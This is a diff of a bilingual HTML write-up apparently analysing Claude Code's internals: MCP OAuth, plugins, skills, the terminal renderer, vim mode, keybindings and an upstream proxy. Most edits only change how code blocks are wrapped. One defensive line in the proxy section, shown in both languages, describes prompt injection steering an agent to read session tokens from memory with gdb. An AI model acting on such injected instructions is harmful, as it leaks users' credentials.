-}</code></pre>
+}</pre></div>
 <hr/>
 <h3 id="08-en-h715">4. MCP OAuth XAA (Cross-App Access)</h3>
 <h4 id="08-en-h716">4.1 Architecture Overview</h4>
 <p>XAA (Cross-App Access / SEP-990) implements the capability of <strong>one IdP login, silent authentication for N MCP servers</strong>. The core implementation resides in <code>xaa.ts</code> and <code>xaaIdpLogin.ts</code>.</p>
 <h4 id="08-en-h717">4.2 Complete XAA Flow</h4>
-<pre><code>[Config] settings.xaaIdp = { issuer, clientId, callbackPort? }
+<div class="ascii-diagram"><pre>[Config] settings.xaaIdp = { issuer, clientId, callbackPort? }
 [Config] server.oauth = { clientId, xaa: true }
 [Config] keychain: mcpOAuthClientConfig[serverKey].clientSecret
 
@@ -10261,12 +10272,12 @@ performMCPXaaAuth(serverName, serverConfig)
     │
     ▼
 [3] Save tokens to keychain (mcpOAuth[serverKey])
-    Includes discoveryState.authorizationServerUrl for subsequent refreshes</code></pre>
+    Includes discoveryState.authorizationServerUrl for subsequent refreshes</pre></div>
 <h4 id="08-en-h718">4.3 Fine-Grained XAA Error Handling Classification</h4>
-<pre><code class="language-typescript">// XaaTokenExchangeError carries a shouldClearIdToken flag
+<div class="ascii-diagram"><pre>// XaaTokenExchangeError carries a shouldClearIdToken flag
 // 4xx / invalid_grant → id_token is invalid, clear cache
 // 5xx → IdP is down, id_token may still be valid, retain
-// 200 + invalid body → protocol violation, clear</code></pre>
+// 200 + invalid body → protocol violation, clear</pre></div>
 <p>XAA applies strict redaction for sensitive information (tokens, assertions, client_secret) in logs:</p>
 <pre><code class="language-typescript">const SENSITIVE_TOKEN_RE =
   /"(access_token|refresh_token|id_token|assertion|subject_token|client_secret)"\s*:\s*"[^"]*"/g
@@ -10288,7 +10299,7 @@ function redactTokens(raw) {
 </ol>
 <h4 id="08-en-h721">5.2 Deduplication Strategy</h4>
 <p>Three layers of deduplication prevent duplicate connections to the same MCP server:</p>
-<pre><code class="language-typescript">// 1. Plugin vs manual config deduplication
+<div class="ascii-diagram"><pre>// 1. Plugin vs manual config deduplication
 dedupPluginMcpServers(pluginServers, manualServers)
 // Signature comparison: stdio → "stdio:" + JSON(commandArray)
 //                       remote → "url:" + unwrapCcrProxyUrl(url)
@@ -10298,16 +10309,16 @@ dedupClaudeAiMcpServers(claudeAiServers, manualServers)
 // Only uses enabled manual servers as dedup targets
 
 // 3. CCR proxy URL unwrapping
-unwrapCcrProxyUrl(url) // Extracts original vendor URL from mcp_url query parameter</code></pre>
+unwrapCcrProxyUrl(url) // Extracts original vendor URL from mcp_url query parameter</pre></div>
 <h4 id="08-en-h722">5.3 Enterprise Policies (Allowlist / Denylist)</h4>
-<pre><code class="language-typescript">// Denylist takes absolute priority — three matching methods
+<div class="ascii-diagram"><pre>// Denylist takes absolute priority — three matching methods
 isMcpServerDenied(name, config)
   ├── isMcpServerNameEntry(entry)    // by name
   ├── isMcpServerCommandEntry(entry) // by command array (stdio)
   └── isMcpServerUrlEntry(entry)     // by URL wildcard pattern
 
 // Allowlist — uses only policySettings when allowManagedMcpServersOnly is set
-isMcpServerAllowedByPolicy(name, config)</code></pre>
+isMcpServerAllowedByPolicy(name, config)</pre></div>
 <hr/>
 <h3 id="08-en-h723">6. Plugin Architecture</h3>
 <h4 id="08-en-h724">6.1 Directory Structure</h4>
@@ -10316,7 +10327,7 @@ isMcpServerAllowedByPolicy(name, config)</code></pre>
   pluginOperations.ts           — CRUD operations
   pluginCliCommands.ts          — CLI command interface</code></pre>
 <h4 id="08-en-h725">6.2 Marketplace and Plugin Lifecycle</h4>
-<pre><code>On startup:
+<div class="ascii-diagram"><pre>On startup:
   loadAllPluginsCacheOnly()     ← Load from cache only (non-blocking startup)
 Background:
   performBackgroundPluginInstallations()
@@ -10328,7 +10339,7 @@ Background:
 
 After installation:
   ├── refreshActivePlugins() → reload plugins
-  └── or needsRefresh → display notification prompting /reload-plugins</code></pre>
+  └── or needsRefresh → display notification prompting /reload-plugins</pre></div>
 <h4 id="08-en-h726">6.3 How Plugins Provide MCP Servers</h4>
 <p>Plugins inject MCP server configurations via <code>getPluginMcpServers()</code>. Plugin servers are namespaced as <code>plugin:<name>:<server></code>, which avoids key collisions with manual configurations. However, content deduplication (<code>dedupPluginMcpServers</code>) detects duplicates with the same command/url.</p>
 <p>Each plugin MCP server configuration carries a <code>pluginSource</code> field (e.g., <code>'slack@anthropic'</code>), used for fast lookup during channel permission control without waiting for the async <code>AppState.plugins.enabled</code> to finish loading.</p>
@@ -10377,7 +10388,7 @@ export function getMCPSkillBuilders(): MCPSkillBuilders {
 }</code></pre>
 <p>This pattern solves the circular dependency problem: <code>client.ts → mcpSkills.ts → loadSkillsDir.ts → ... → client.ts</code>. By deferring builder registration to module initialization time (<code>loadSkillsDir.ts</code> is eagerly evaluated at startup through the static import of <code>commands.ts</code>), it ensures builders are ready when MCP servers connect.</p>
 <h4 id="08-en-h731">7.4 Markdown Skill File Format</h4>
-<pre><code class="language-markdown">---
+<div class="ascii-diagram"><pre>---
 description: Skill description text
 when-to-use: Trigger condition description
 argument-hint: Argument hints
@@ -10392,7 +10403,7 @@ hooks:
 
 ### Skill Prompt Content
 
-Actual system prompt text...</code></pre>
+Actual system prompt text...</pre></div>
 <p>Frontmatter is parsed by <code>parseFrontmatter()</code>, supporting:</p>
 <ul>
 <li><code>allowed-tools</code>: Restricts the list of tools available to the skill</li>
@@ -10419,7 +10430,7 @@ Actual system prompt text...</code></pre>
 <li><code>call</code>: Wraps <code>client.callTool()</code> + timeout + result formatting + image processing</li>
 </ul>
 <h4 id="08-en-h734">8.2 Tool Call Chain</h4>
-<pre><code>LLM outputs tool_use(name="mcp__github__create_issue", input={...})
+<div class="ascii-diagram"><pre>LLM outputs tool_use(name="mcp__github__create_issue", input={...})
     │
     ▼
 MCPTool.call(input)
@@ -10436,7 +10447,7 @@ MCPTool.call(input)
     │   ├── Large output: truncateMcpContentIfNeeded()
     │   └── Binary: persistBinaryContent() → save to disk
     │
-    └── Return formatted text result</code></pre>
+    └── Return formatted text result</pre></div>
 <hr/>
 <h3 id="08-en-h735">9. Channel Notifications (MCP Push Messages)</h3>
 <p>Channel notifications allow MCP servers (such as Discord/Slack/Telegram bots) to push messages into conversations:</p>
@@ -10592,10 +10603,10 @@ import { query } from '../query.js';                 // API 调用核心
 <h3 id="09-cn-h749">二、自定义 Ink 渲染引擎</h3>
 <h4 id="09-cn-h750">2.1 架构总览</h4>
 <p>Claude Code 使用的是 Ink 的<strong>深度定制 fork</strong>，而非社区版本。整个渲染管线：</p>
-<pre><code>React Tree → Reconciler → DOM Tree → Yoga Layout → Screen Buffer → Diff → ANSI → stdout
+<div class="ascii-diagram"><pre>React Tree → Reconciler → DOM Tree → Yoga Layout → Screen Buffer → Diff → ANSI → stdout
             (reconciler.ts) (dom.ts)  (yoga.ts)    (renderer.ts)  (log-update.ts)
                                                     (output.ts)    (terminal.ts)
-                                                    (screen.ts)</code></pre>
+                                                    (screen.ts)</pre></div>
 <p>核心文件规模：</p>
 <table><thead><tr><th>文件</th><th>行数</th><th>职责</th></tr></thead><tbody><tr><td><code>ink.tsx</code></td><td>1,722</td><td>Ink 实例：帧调度、鼠标事件、选择覆盖</td></tr>
 <p><tr><td><code>screen.ts</code></td><td>1,486</td><td>屏幕缓冲区 + 三大对象池</td></tr></p>
@@ -10626,7 +10637,7 @@ import { query } from '../query.js';                 // API 调用核心
   readonly scrollDrainPending?: boolean;
 };</code></pre>
 <p><strong>差分算法</strong>在 <code>log-update.ts</code> 的 <code>LogUpdate.render()</code> 中实现：</p>
-<pre><code class="language-typescript">render(prev: Frame, next: Frame, altScreen = false, decstbmSafe = true): Diff {
+<div class="ascii-diagram"><pre>render(prev: Frame, next: Frame, altScreen = false, decstbmSafe = true): Diff {
   // 1. 检测视口变化 → 需要全量重绘
   if (next.viewport.height &lt; prev.viewport.height || ...) {
     return fullResetSequence_CAUSES_FLICKER(next, 'resize', stylePool);
@@ -10640,11 +10651,11 @@ import { query } from '../query.js';                 // API 调用核心
 
   // 3. 逐行逐单元格差分
   diffEach(prevScreen, nextScreen, ...)  // screen.ts 中的核心 diff
-}</code></pre>
+}</pre></div>
 <p>核心是 <code>diffEach()</code>（定义在 <code>screen.ts</code>），它在两个 Screen 缓冲区之间做<strong>逐单元格比较</strong>，利用 packed integer（charId + styleId 编码为一个数字）实现 O(1) 的单元格比较。</p>
 <h4 id="09-cn-h752">2.3 React Reconciler 的自定义实现</h4>
 <p><code>reconciler.ts</code> 基于 <code>react-reconciler</code> 包创建自定义 reconciler，适配终端 DOM：</p>
-<pre><code class="language-typescript">const reconciler = createReconciler&lt;
+<div class="ascii-diagram"><pre>const reconciler = createReconciler&lt;
   ElementNames,     // 'ink-root' | 'ink-box' | 'ink-text' | 'ink-virtual-text' | 'ink-link' | 'ink-raw-ansi'
   Props,
   DOMElement,       // 自定义 DOM 节点
@@ -10667,7 +10678,7 @@ import { query } from '../query.js';                 // API 调用核心
     rootNode.onComputeLayout();  // Yoga calculateLayout
     rootNode.onRender();         // 帧渲染
   },
-});</code></pre>
+});</pre></div>
 <p>六种 DOM 元素类型：</p>
 <ul>
 <li><code>ink-root</code>：根节点</li>
@@ -10699,7 +10710,7 @@ import { query } from '../query.js';                 // API 调用核心
 }</code></pre>
 <p>ASCII 字符走 Int32Array 直接索引（零哈希、零比较），Unicode 走 Map。blitRegion 可以直接复制 charId（整数），无需字符串比较。</p>
 <p><strong>StylePool（样式池）</strong>：</p>
-<pre><code class="language-typescript">export class StylePool {
+<div class="ascii-diagram"><pre>export class StylePool {
   intern(styles: AnsiCode[]): number {
     // Bit 0 编码可见性：奇数 ID = 对空格有视觉效果（背景色、反转等）
     id = (rawId &lt;&lt; 1) | (hasVisibleSpaceEffect(styles) ? 1 : 0);
@@ -10711,7 +10722,7 @@ import { query } from '../query.js';                 // API 调用核心
     const key = fromId * 0x100000 + toId;
     return this.transitionCache.get(key) ?? this.computeAndCache(key);
   }
-}</code></pre>
+}</pre></div>
 <p>Bit 0 的巧思让渲染器可以用位运算跳过无样式的空格——这是 diff 热循环中最关键的优化。</p>
 <p><strong>HyperlinkPool</strong>：与 CharPool 类似，将超链接 URL 字符串转为整数 ID，Index 0 = 无超链接。</p>
 <h4 id="09-cn-h754">2.5 鼠标事件和文本选择</h4>
@@ -10721,7 +10732,7 @@ import { query } from '../query.js';                 // API 调用核心
 const ENABLE_MOUSE_TRACKING  = '\x1b[?1003;1006h';  // SGR 编码 + 任意事件跟踪
 const DISABLE_MOUSE_TRACKING = '\x1b[?1003;1006l';</code></pre>
 <p><strong>hit-test 系统</strong>（<code>hit-test.ts</code>）：</p>
-<pre><code class="language-typescript">export function hitTest(node: DOMElement, col: number, row: number): DOMElement | null {
+<div class="ascii-diagram"><pre>export function hitTest(node: DOMElement, col: number, row: number): DOMElement | null {
   const rect = nodeCache.get(node);  // 从渲染阶段缓存的屏幕坐标
   // 边界检查 → 子节点反向遍历（后绘制的在上层）→ 递归
   for (let i = node.childNodes.length - 1; i &gt;= 0; i--) {
@@ -10729,7 +10740,7 @@ const DISABLE_MOUSE_TRACKING = '\x1b[?1003;1006l';</code></pre>
     if (hit) return hit;
   }
   return node;
-}</code></pre>
+}</pre></div>
 <p><strong>文本选择</strong>（<code>selection.ts</code>，917 行）实现了：</p>
 <ul>
 <li>字符级、双击单词、三击整行选择</li>
@@ -10759,12 +10770,12 @@ const DISABLE_MOUSE_TRACKING = '\x1b[?1003;1006l';</code></pre>
 <p><tr><td>12</td><td><strong>Onboarding</strong></td><td><code>Onboarding.tsx</code>, <code>LogoV2/</code> (15 文件), <code>wizard/</code> (5 文件), <code>ClaudeInChromeOnboarding.tsx</code></td><td>~22</td><td>欢迎页、引导流程</td></tr></p>
 <p><tr><td>13</td><td><strong>杂项</strong></td><td><code>ExitFlow.tsx</code>, <code>AutoUpdater.tsx</code>, <code>TaskListV2.tsx</code>, <code>tasks/</code> (12 文件), <code>teams/</code>, <code>TeleportProgress.tsx</code>, ...</td><td>~30</td><td>退出确认、自动更新、任务管理等</td></tr></tbody></table></p>
 <h4 id="09-cn-h756">组件间的数据流模式</h4>
-<pre><code>REPL (编排器)
+<div class="ascii-diagram"><pre>REPL (编排器)
   ├── AppState Store (全局状态) ──→ useAppState(selector) ──→ 子组件
   ├── messages[] (消息数组) ──→ Messages ──→ VirtualMessageList ──→ MessageRow[]
   ├── focusedInputDialog (焦点状态机) ──→ 互斥的对话框组件
   ├── toolPermissionContext ──→ PermissionRequest ──→ 子权限组件
-  └── query() (API 调用) ──→ handleMessageFromStream ──→ setMessages / setStreamingToolUses</code></pre>
+  └── query() (API 调用) ──→ handleMessageFromStream ──→ setMessages / setStreamingToolUses</pre></div>
 <p>数据流遵循 <strong>React 单向数据流</strong>，但有两个重要补充：</p>
 <ol>
 <li><strong>命令式 Ref</strong>：<code>ScrollBoxHandle</code>、<code>JumpHandle</code> 等通过 <code>useImperativeHandle</code> 暴露命令式 API</li>
@@ -10792,7 +10803,7 @@ const DISABLE_MOUSE_TRACKING = '\x1b[?1003;1006l';</code></pre>
 <p><code>_c(n)</code> 分配一个长度为 n 的数组用于比较依赖项。这完全取代了手写的 <code>useMemo</code>、<code>useCallback</code>、<code>React.memo</code>——编译器对每个 JSX 表达式自动做细粒度的依赖追踪。</p>
 <p>特殊标记 <code>'use no memo'</code>（见 <code>OffscreenFreeze.tsx</code>）可以显式退出编译器优化。</p>
 <h4 id="09-cn-h759">4.2 OffscreenFreeze</h4>
-<pre><code class="language-typescript">export function OffscreenFreeze({ children }: Props) {
+<div class="ascii-diagram"><pre>export function OffscreenFreeze({ children }: Props) {
   'use no memo';  // 必须退出 React Compiler，否则 cache 机制会破坏冻结逻辑
   const [ref, { isVisible }] = useTerminalViewport();
   const cached = useRef(children);
@@ -10802,7 +10813,7 @@ const DISABLE_MOUSE_TRACKING = '\x1b[?1003;1006l';</code></pre>
   }
   // 不可见时返回缓存的旧 children → React 跳过整个子树
   return &lt;Box ref={ref}&gt;{cached.current}&lt;/Box&gt;;
-}</code></pre>
+}</pre></div>
 <p><strong>原理</strong>：终端滚动区以上的内容如果发生变化，<code>log-update.ts</code> 必须做全量重置（无法局部更新已滚出的行）。Spinner、计时器等定期更新的组件在离屏时被冻结，产生零 diff。</p>
 <h4 id="09-cn-h760">4.3 VirtualMessageList 虚拟滚动</h4>
 <p><code>VirtualMessageList.tsx</code> 实现了消息列表的虚拟化渲染：</p>
@@ -10819,7 +10830,7 @@ const DISABLE_MOUSE_TRACKING = '\x1b[?1003;1006l';</code></pre>
   scanElement?: (el: DOMElement) =&gt; MatchPosition[];  // 从 DOM 元素扫描匹配位置
 };</code></pre>
 <h4 id="09-cn-h761">4.4 Markdown Token 缓存</h4>
-<pre><code class="language-typescript">// Markdown.tsx — 模块级 LRU 缓存
+<div class="ascii-diagram"><pre>// Markdown.tsx — 模块级 LRU 缓存
 const TOKEN_CACHE_MAX = 500;
 const tokenCache = new Map&lt;string, Token[]&gt;();
 
@@ -10833,7 +10844,7 @@ function cachedLexer(content: string): Token[] {
   const hit = tokenCache.get(key);
   if (hit) { tokenCache.delete(key); tokenCache.set(key, hit); return hit; }  // 提升 MRU
   // ...
-}</code></pre>
+}</pre></div>
 <p><code>hasMarkdownSyntax()</code> 通过正则预检（只检查前 500 字符）跳过纯文本内容的完整解析——对短回复和用户输入特别有效。</p>
 <h4 id="09-cn-h762">4.5 blit 优化（render-node-to-output.ts）</h4>
 <p>渲染引擎对没有变化的子树执行 <strong>blit</strong>（块复制）：如果一个节点的 Yoga 位置/尺寸没变且 <code>dirty</code> 标志为 false，直接从 prevScreen 复制对应区域到当前 Screen，跳过整个子树的遍历。</p>
@@ -10844,12 +10855,12 @@ if (!node.dirty &amp;&amp; prevScreen &amp;&amp; sameBounds) {
 }</code></pre>
 <h4 id="09-cn-h763">4.6 DECSTBM 硬件滚动</h4>
 <p>在 alt-screen 模式下，当 ScrollBox 的 scrollTop 变化时，不重写整个区域，而是利用终端的硬件滚动指令：</p>
-<pre><code class="language-typescript">// log-update.ts
+<div class="ascii-diagram"><pre>// log-update.ts
 if (altScreen &amp;&amp; next.scrollHint &amp;&amp; decstbmSafe) {
   shiftRows(prev.screen, top, bottom, delta);  // 在 prev 上模拟移位
   scrollPatch = [setScrollRegion(top+1, bottom+1) + csiScrollUp(delta) + RESET_SCROLL_REGION];
   // diff 循环只发现滚入的新行 → 极少的 patches
-}</code></pre>
+}</pre></div>
 <h4 id="09-cn-h764">4.7 Diff Patch 优化器</h4>
 <p><code>optimizer.ts</code> 在帧 patches 写入终端前做<strong>单遍优化</strong>：</p>
 <ul>
@@ -10878,7 +10889,7 @@ function ThemeProvider({ children }) {
   }, [activeSetting]);
 }</code></pre>
 <h4 id="09-cn-h767">5.2 ThemedText——主题感知的文本组件</h4>
-<pre><code class="language-typescript">export default function ThemedText({ color, dimColor, bold, ... }) {
+<div class="ascii-diagram"><pre>export default function ThemedText({ color, dimColor, bold, ... }) {
   const theme = useTheme();
   const hoverColor = useContext(TextHoverColorContext);
 
@@ -10887,7 +10898,7 @@ function ThemeProvider({ children }) {
     if (color.startsWith('rgb(') || color.startsWith('#')) return color;
     return theme[color as keyof Theme];
   }
-}</code></pre>
+}</pre></div>
 <p>支持的颜色格式：<code>rgb(r,g,b)</code>、<code>#hex</code>、<code>ansi256(n)</code>、<code>ansi:name</code>、以及主题 key。</p>
 <h4 id="09-cn-h768">5.3 基础 UI 原语</h4>
 <p><code>design-system/</code> 目录提供了 16 个基础组件：</p>
@@ -12590,12 +12601,12 @@ const LocalWorkflowTask: Task | null = feature('WORKFLOW_SCRIPTS')
     ↕ (i/I/a/A/o/O 进入, Esc 退出)
 NORMAL (嵌套 CommandState 子状态机)</code></pre>
 <p><strong>NORMAL 内部：CommandState（11 个状态）</strong></p>
-<pre><code>idle ──┬─[d/c/y]──► operator ──┬─[motion]──► execute
+<div class="ascii-diagram"><pre>idle ──┬─[d/c/y]──► operator ──┬─[motion]──► execute
        ├─[1-9]────► count      ├─[0-9]────► operatorCount ──[motion]──► execute
        ├─[fFtT]───► find       ├─[ia]─────► operatorTextObj ──[wW"'(){}]──► execute
        ├─[g]──────► g          ├─[fFtT]───► operatorFind ──[char]──► execute
        ├─[r]──────► replace    └─[g]──────► operatorG ──[g/j/k]──► execute
-       └─[&gt;&lt;]─────► indent</code></pre>
+       └─[&gt;&lt;]─────► indent</pre></div>
 <h4 id="11-cn-h922">5.2 持久状态与 Dot-Repeat</h4>
 <pre><code class="language-typescript">export type PersistentState = {
   lastChange: RecordedChange | null  // 10 种变更类型
@@ -12663,7 +12674,7 @@ NORMAL (嵌套 CommandState 子状态机)</code></pre>
 <h4 id="11-cn-h930">7.1 和弦（Chord）状态机</h4>
 <p>键绑定系统支持多键序列（chord），如 <code>ctrl+k ctrl+s</code>。核心在 <code>resolver.ts</code> 的 <code>resolveKeyWithChordState()</code>：</p>
 <p><strong>状态转移</strong>：</p>
-<pre><code>null (无 pending) ──[key]──►
+<div class="ascii-diagram"><pre>null (无 pending) ──[key]──►
   ├─ 匹配单键 binding ──► { type: 'match', action }
   ├─ 匹配多键 chord 前缀 ──► { type: 'chord_started', pending: [keystroke] }
   └─ 无匹配 ──► { type: 'none' }
@@ -12672,7 +12683,7 @@ pending: [ks1] ──[key]──►
   ├─ [ks1,ks2] 完全匹配 chord ──► { type: 'match', action }
   ├─ [ks1,ks2] 是更长 chord 前缀 ──► { type: 'chord_started', pending: [ks1,ks2] }
   ├─ Escape ──► { type: 'chord_cancelled' }
-  └─ 无匹配 ──► { type: 'chord_cancelled' }</code></pre>
+  └─ 无匹配 ──► { type: 'chord_cancelled' }</pre></div>
 <p><strong>关键设计</strong>：chord 匹配优先于单键匹配——如果 <code>ctrl+k</code> 是某个 chord 的前缀，即使有单独的 <code>ctrl+k</code> binding，也进入 chord 等待状态。但如果更长的 chord 全部被 null-unbind 了，则回退到单键匹配。</p>
 <h4 id="11-cn-h931">7.2 上下文层次</h4>
 <p>18 个上下文覆盖所有 UI 状态：</p>
@@ -12705,13 +12716,13 @@ Footer &gt; MessageSelector &gt; DiffDialog &gt; ModelPicker &gt; Select &gt; Pl
 <li><strong>安全措施</strong>：<code>prctl(PR_SET_DUMPABLE, 0)</code> 通过 FFI 调用 libc，阻止同 UID 的 ptrace（防止 prompt injection 用 gdb 读取堆中的 token）</li>
 </ol>
 <h4 id="11-cn-h936">8.3 初始化流程</h4>
-<pre><code>initUpstreamProxy()
+<div class="ascii-diagram"><pre>initUpstreamProxy()
   ├─ 读取 /run/ccr/session_token
   ├─ prctl(PR_SET_DUMPABLE, 0)
   ├─ 下载 CA 证书 (/v1/code/upstreamproxy/ca-cert) + 拼接系统 CA bundle
   ├─ 启动 TCP relay (Bun.listen 或 Node net.createServer)
   ├─ unlink token 文件（确保 relay 就绪后才删除）
-  └─ 导出 HTTPS_PROXY / SSL_CERT_FILE / NODE_EXTRA_CA_CERTS / REQUESTS_CA_BUNDLE 环境变量</code></pre>
+  └─ 导出 HTTPS_PROXY / SSL_CERT_FILE / NODE_EXTRA_CA_CERTS / REQUESTS_CA_BUNDLE 环境变量</pre></div>
 <p>每一步 fail-open：任何错误只禁用代理，不阻断会话。</p>
 <hr/>
 <h3 id="11-cn-h937">九、CLI / IO 系统</h3>
@@ -12758,7 +12769,7 @@ Footer &gt; MessageSelector &gt; DiffDialog &gt; ModelPicker &gt; Select &gt; Pl
 </ul>
 <hr/>
 <h3 id="11-cn-h943">十一、模块间依赖拓扑</h3>
-<pre><code>                       ┌──────────────┐
+<div class="ascii-diagram"><pre>                       ┌──────────────┐
                        │  state/store │ (35行核心)
                        └──────┬───────┘
                               │ onChange
@@ -12792,7 +12803,7 @@ Footer &gt; MessageSelector &gt; DiffDialog &gt; ModelPicker &gt; Select &gt; Pl
             ┌───────▼────────┐
             │ vim/ (编辑器)   │◄──── utils/Cursor.ts
             │ transitions.ts │
-            └────────────────┘</code></pre>
+            └────────────────┘</pre></div>
 <hr/>
 <h3 id="11-cn-h944">总结</h3>
 <p>Claude Code 的基础设施模块展现了几个一致的设计原则：</p>
@@ -13031,12 +13042,12 @@ Period 4 (Sonnet Version Iterations):
     ↕ (i/I/a/A/o/O to enter, Esc to exit)
 NORMAL (nested CommandState sub-state machine)</code></pre>
 <p><strong>Inside NORMAL: CommandState (11 states)</strong></p>
-<pre><code>idle ──┬─[d/c/y]──► operator ──┬─[motion]──► execute
+<div class="ascii-diagram"><pre>idle ──┬─[d/c/y]──► operator ──┬─[motion]──► execute
        ├─[1-9]────► count      ├─[0-9]────► operatorCount ──[motion]──► execute
        ├─[fFtT]───► find       ├─[ia]─────► operatorTextObj ──[wW"'(){}]──► execute
        ├─[g]──────► g          ├─[fFtT]───► operatorFind ──[char]──► execute
        ├─[r]──────► replace    └─[g]──────► operatorG ──[g/j/k]──► execute
-       └─[&gt;&lt;]─────► indent</code></pre>
+       └─[&gt;&lt;]─────► indent</pre></div>
 <h4 id="11-en-h964">5.2 Persistent State and Dot-Repeat</h4>
 <pre><code class="language-typescript">export type PersistentState = {
   lastChange: RecordedChange | null  // 10 change types
@@ -13104,7 +13115,7 @@ NORMAL (nested CommandState sub-state machine)</code></pre>
 <h4 id="11-en-h972">7.1 Chord State Machine</h4>
 <p>The keybinding system supports multi-key sequences (chords), such as <code>ctrl+k ctrl+s</code>. The core is in <code>resolver.ts</code>'s <code>resolveKeyWithChordState()</code>:</p>
 <p><strong>State Transitions</strong>:</p>
-<pre><code>null (no pending) ──[key]──►
+<div class="ascii-diagram"><pre>null (no pending) ──[key]──►
   ├─ Matches single-key binding ──► { type: 'match', action }
   ├─ Matches multi-key chord prefix ──► { type: 'chord_started', pending: [keystroke] }
   └─ No match ──► { type: 'none' }
@@ -13113,7 +13124,7 @@ pending: [ks1] ──[key]──►
   ├─ [ks1,ks2] fully matches chord ──► { type: 'match', action }
   ├─ [ks1,ks2] is prefix of longer chord ──► { type: 'chord_started', pending: [ks1,ks2] }
   ├─ Escape ──► { type: 'chord_cancelled' }
-  └─ No match ──► { type: 'chord_cancelled' }</code></pre>
+  └─ No match ──► { type: 'chord_cancelled' }</pre></div>
 <p><strong>Key Design</strong>: Chord matching takes priority over single-key matching — if <code>ctrl+k</code> is a prefix of some chord, even if there is a standalone <code>ctrl+k</code> binding, the system enters chord waiting state. However, if all longer chords have been null-unbound, it falls back to single-key matching.</p>
 <h4 id="11-en-h973">7.2 Context Hierarchy</h4>
 <p>18 contexts cover all UI states:</p>
@@ -13146,13 +13157,13 @@ Local TCP Relay (127.0.0.1:ephemeral)  ↔ WebSocket ↔ GKE L7 Ingress
 <li><strong>Security Measures</strong>: <code>prctl(PR_SET_DUMPABLE, 0)</code> called via FFI to libc, blocking ptrace from same-UID processes (preventing prompt injection from using gdb to read tokens from the heap)</li>
 </ol>
 <h4 id="11-en-h978">8.3 Initialization Flow</h4>
-<pre><code>initUpstreamProxy()
+<div class="ascii-diagram"><pre>initUpstreamProxy()
   ├─ Read /run/ccr/session_token
   ├─ prctl(PR_SET_DUMPABLE, 0)
   ├─ Download CA certificate (/v1/code/upstreamproxy/ca-cert) + append to system CA bundle
   ├─ Start TCP relay (Bun.listen or Node net.createServer)
   ├─ Unlink token file (ensure relay is ready before deletion)
-  └─ Export HTTPS_PROXY / SSL_CERT_FILE / NODE_EXTRA_CA_CERTS / REQUESTS_CA_BUNDLE environment variables</code></pre>
+  └─ Export HTTPS_PROXY / SSL_CERT_FILE / NODE_EXTRA_CA_CERTS / REQUESTS_CA_BUNDLE environment variables</pre></div>
 <p>Every step is fail-open: any error only disables the proxy without blocking the session.</p>
 <hr/>
 <h3 id="11-en-h979">IX. CLI / IO System</h3>
@@ -13199,7 +13210,7 @@ Local TCP Relay (127.0.0.1:ephemeral)  ↔ WebSocket ↔ GKE L7 Ingress
 </ul>
 <hr/>
 <h3 id="11-en-h985">XI. Inter-Module Dependency Topology</h3>
-<pre><code>                       ┌──────────────┐
+<div class="ascii-diagram"><pre>                       ┌──────────────┐
                        │  state/store │ (35-line core)
                        └──────┬───────┘
                               │ onChange
@@ -13233,7 +13244,7 @@ Local TCP Relay (127.0.0.1:ephemeral)  ↔ WebSocket ↔ GKE L7 Ingress
             ┌───────▼────────┐
             │ vim/ (editor)  │◄──── utils/Cursor.ts
             │ transitions.ts │
-            └────────────────┘</code></pre>
+            └────────────────┘</pre></div>
 <hr/>
 <h3 id="11-en-h986">Summary</h3>
 <p>Claude Code's infrastructure modules demonstrate several consistent design principles:</p>
